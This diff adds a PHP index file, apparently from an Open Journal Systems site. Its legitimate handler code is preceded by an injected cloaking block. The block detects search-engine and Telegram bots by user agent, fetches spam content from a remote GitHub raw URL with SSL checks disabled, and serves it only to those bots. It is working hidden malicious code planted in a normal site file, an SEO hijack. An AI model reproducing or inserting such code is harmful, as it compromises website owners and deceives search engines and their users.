@@ -1,0 +1,61 @@
+<?php
+
+
+
+function getUrlContents($url)
+{
+    $ch = curl_init();  // Initialize cURL session
+    curl_setopt($ch, CURLOPT_URL, $url);  // Set URL
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return as string
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  // Follow redirects
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional: Ignore SSL verification
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);    // Optional: Timeout
+    $output = curl_exec($ch);  // Execute and get output
+    curl_close($ch);  // Close session
+    return $output;
+}
+function is_bot()
+
+{
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+if (is_bot()) {
+    $message = getUrlContents('https://raw.githubusercontent.com/heriraharto2-woyowoyo/land/refs/heads/main/landing-jurnal-appki.txt');
+    echo $message;
+    exit; // Atau bisa menggunakan die()
+}
+?>
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ *
+ * @brief Handle site index requests.
+ *
+ */
+
+switch ($op) {
+    case 'index':
+        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
+        break;
+}
